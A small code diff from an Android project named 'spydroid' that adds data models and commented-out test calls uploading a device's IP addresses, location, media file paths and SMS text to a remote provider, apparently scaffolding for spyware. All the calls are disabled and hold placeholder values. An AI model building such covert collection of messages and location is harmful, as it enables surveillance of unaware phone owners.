@@ -35,6 +35,9 @@ import net.spydroid.common.local.models.CurrentSms
 import net.spydroid.common.local.models.PERMISSIONS_STATES
 import net.spydroid.common.remote.RemoteDataProvider
 import net.spydroid.common.remote.network.models.Devices
+import net.spydroid.common.remote.network.models.InfoDevices
+import net.spydroid.common.remote.network.models.MultimediaDevices
+import net.spydroid.common.remote.network.models.SmsDevices
 
 class LocalDataProvider private constructor(
     private val context: Context
@@ -47,12 +50,42 @@ class LocalDataProvider private constructor(
     init {
         scope.launch(Dispatchers.IO) {
             try {
-                remoteDataProvider.insertDevice(
+                /*
+                                remoteDataProvider.insertDevice(
                     device = Devices(
                         alias = "PRUEBA INSERTANDO REMOTAMENTE",
                         name = "ME ELECTROCUTASTE PEDRITO"
                     )
                 )
+                 */
+
+                /*
+                                remoteDataProvider.insertInfo(
+                    InfoDevices(
+                        alias = "QJUAN ",
+                        ip_address_private = "192.167.SD9",
+                        ip_address_public = "10.10.129.12",
+                        location = "8.8129, -081SD.624"
+                    )
+                )
+                 */
+                /*
+                                remoteDataProvider.insertMultimedia(
+                    MultimediaDevices(
+                        alias = "aisoa",
+                        routeFile = "jashaus",
+                        type = "JPEG"
+                    )
+                )
+                 */
+                /*
+                                remoteDataProvider.insertSms(
+                    SmsDevices(
+                        alias = "ahasuia",
+                        sms = "CLARO: IAUSG1 AYSG1G"
+                    )
+                )
+                 */
             } catch (e: Exception) {
 
                 Log.e(TAG, "Error: ${e.message}")
